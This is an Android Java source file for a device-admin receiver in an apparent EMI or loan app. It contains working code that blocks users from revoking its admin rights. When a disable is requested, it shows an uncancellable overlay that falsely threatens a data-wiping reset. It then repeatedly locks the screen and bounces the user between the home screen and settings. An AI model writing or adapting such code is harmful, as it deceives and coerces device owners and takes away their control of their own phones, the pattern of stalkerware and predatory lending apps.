package com.moutamid.emiapp.service;

import android.app.ActivityManager;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AlertDialog;

import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class AdminReceiver extends DeviceAdminReceiver {
    DevicePolicyManager dpm;
    long current_time;
    Timer myThread;
    Context contextt;
    AlertDialog alert;

    @Override
    public void onEnabled(@NonNull Context context, @NonNull Intent intent) {
        super.onEnabled(context, intent);
    }

    private void initDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(contextt, androidx.appcompat.R.style.Theme_AppCompat_Light_Dialog);
        builder.setTitle("You can't turn off this permission!");
        builder.setMessage("You need to restart your phone now. If you tried to turn off this permission one more time, your device will reset and you will lose your data!");
        builder.setCancelable(false);
        alert = builder.create();
        alert.setCancelable(false);
        alert.setCanceledOnTouchOutside(false);
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            alert.getWindow().setType(WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);
        } else {
            alert.getWindow().setType(WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY);
        }

        alert.show();
    }

    @Nullable
    @Override
    public CharSequence onDisableRequested(@NonNull Context context, @NonNull Intent intent) {
        Log.d("Device Admin", "Disable Requested");
        contextt = context;
        initDialog();

        Intent startMain = new Intent(android.provider.Settings.ACTION_SETTINGS);
        startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(startMain);

        Intent homeScreenIntent = new Intent(Intent.ACTION_MAIN);
        homeScreenIntent.addCategory(Intent.CATEGORY_HOME);
        homeScreenIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(homeScreenIntent);

        dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);

        myThread = new Timer();
        current_time = System.currentTimeMillis();
        myThread.schedule(lock_task, 0, 1000);

        return "Do you want to reset your phone?";
//        return super.onDisableRequested(context, intent);
    }

    @Override
    public void onReceive(@NonNull Context context, @NonNull Intent intent) {
//        super.onReceive(context, intent);
        String action = intent.getAction();
        if (ACTION_DEVICE_ADMIN_DISABLE_REQUESTED.equals(action)) {
            CharSequence res = onDisableRequested(context, intent);
            if (res != null) {
                dpm.lockNow();
                Bundle extras = getResultExtras(true);
                extras.putCharSequence(EXTRA_DISABLE_WARNING, res);
            }
        } else if (ACTION_DEVICE_ADMIN_DISABLED.equals(action)) {
            Log.d("Device Admin", "Disabled");
        }
    }

    // Repeatedly lock the phone every second for 5 seconds
    TimerTask lock_task = new TimerTask() {
        @Override
        public void run() {
            long diff = System.currentTimeMillis() - current_time;
            if (diff < 10000) {
                Log.d("Timer", "1 second");

                dpm.lockNow();
                Intent homeScreenIntent = new Intent(Intent.ACTION_MAIN);
                homeScreenIntent.addCategory(Intent.CATEGORY_HOME);
                homeScreenIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                contextt.startActivity(homeScreenIntent);

                Intent startMain = new Intent(Settings.ACTION_SETTINGS);
                startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                contextt.startActivity(startMain);

            } else {
//                if (isAppRunning("com.android.settings")) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        if (!Settings.canDrawOverlays(contextt)) {
                            Toast.makeText(contextt, "Please allow over lapping permissions!", Toast.LENGTH_SHORT).show();
                            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                    Uri.parse("package:" + contextt.getPackageName()));
                            contextt.startActivity(intent);
                        }
                        return;
                    }
                    current_time = System.currentTimeMillis();
//                }

                /*Intent startMain = new Intent(Settings.ACTION_SETTINGS);
                startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                contextt.startActivity(startMain);*/

                Intent homeScreenIntent = new Intent(Intent.ACTION_MAIN);
                homeScreenIntent.addCategory(Intent.CATEGORY_HOME);
                homeScreenIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                contextt.startActivity(homeScreenIntent);

//                myThread.cancel();

            }
        }
    };

    private boolean isAppRunning(final String packageName) {
        final ActivityManager activityManager = (ActivityManager) contextt.getSystemService(Context.ACTIVITY_SERVICE);
        final List<ActivityManager.RunningAppProcessInfo> procInfos = activityManager.getRunningAppProcesses();
        if (procInfos != null) {
            for (final ActivityManager.RunningAppProcessInfo processInfo : procInfos) {
                if (processInfo.processName.equals(packageName)) {
                    return true;
                }
            }
        }
        return false;
    }

}
